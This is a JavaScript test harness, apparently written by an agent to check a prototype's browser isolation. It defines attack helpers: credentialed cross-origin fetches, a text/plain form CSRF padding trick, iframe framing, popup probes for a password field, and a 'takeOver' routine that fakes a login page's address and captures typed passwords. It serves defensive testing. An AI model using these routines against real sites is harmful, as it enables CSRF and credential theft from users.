// "Kod prototypu napisany przez agenta": plik testowy kopiowany do katalogu prototypu. Tylko wywołania, które może zrobić każda strona.
'use strict';
(function () {
  var opened = [];
  var frames = 0;
  var failed = function (error) { return { read: false, error: String(error && error.name || error) }; };
  window.attack = {
    captured: null,
    read: function (url) {
      return fetch(url, { credentials: 'include' }).then(function (r) { return r.text().then(function (body) { return { read: true, status: r.status, body: body }; }); }).catch(failed);
    },
    noCors: function (url, body) {
      return fetch(url, { method: 'POST', mode: 'no-cors', credentials: 'include', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(body) })
        .then(function (r) { return { sent: true, type: r.type }; }).catch(failed);
    },
    json: function (url, body) {
      return fetch(url, { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json', 'X-Status-Board': '1', 'X-Skillsync-CSRF': 'x' }, body: JSON.stringify(body) })
        .then(function (r) { return { read: true, status: r.status }; }).catch(failed);
    },
    form: function (url, body) {
      // text/plain: pole `<json bez zamknięcia>` + wartość dają poprawny JSON w ciele
      var frame = document.createElement('iframe');
      frame.name = 'sink' + (++frames);
      frame.hidden = true;
      document.body.appendChild(frame);
      var form = document.createElement('form');
      form.method = 'post'; form.action = url; form.enctype = 'text/plain'; form.target = frame.name;
      var input = document.createElement('input');
      input.name = JSON.stringify(body).slice(0, -1) + ',"pad":"';
      input.value = '"}';
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      return new Promise(function (ok) { setTimeout(function () { ok({ sent: true }); }, 500); });
    },
    frame: function (url) {
      var frame = document.createElement('iframe');
      frame.src = url;
      document.body.appendChild(frame);
      return true;
    },
    open: function (url) {
      var w = window.open(url, '_blank', 'width=500,height=600');
      if (w) opened.push(w);
      return !!w;
    },
    probe: function () {
      var w = opened[opened.length - 1];
      var attempt = function (fn) { try { fn(); return 'READ'; } catch (e) { return e.name; } };
      return {
        document: attempt(function () { return w.document.title; }),
        password: attempt(function () { return w.document.querySelector('#password').value; }),
        location: attempt(function () { return w.location.href; }),
        listener: attempt(function () { w.addEventListener('input', function () {}); })
      };
    },
    // Pobiera prawdziwy formularz logowania i rysuje go w TYM dokumencie pod jego adresem; to, co użytkownik wpisze, czyta ten skrypt.
    takeOver: function (url) {
      return fetch(url, { credentials: 'include' }).then(function (r) { return r.text(); }).then(function (text) {
        var copy = new DOMParser().parseFromString(text, 'text/html');
        copy.querySelectorAll('script').forEach(function (s) { s.remove(); });
        history.replaceState(null, '', url);
        document.body.replaceWith(document.adoptNode(copy.body));
        document.addEventListener('input', function (e) { if (e.target.id === 'password') window.attack.captured = e.target.value; }, true);
        return { taken: true, address: location.href };
      }).catch(function (error) { return { taken: false, error: String(error && error.name || error) }; });
    },
    post: function (messages) {
      opened.forEach(function (w) { messages.forEach(function (m) { w.postMessage(m, '*'); }); });
      return true;
    },
    close: function () { opened.forEach(function (w) { w.close(); }); return true; }
  };
}());
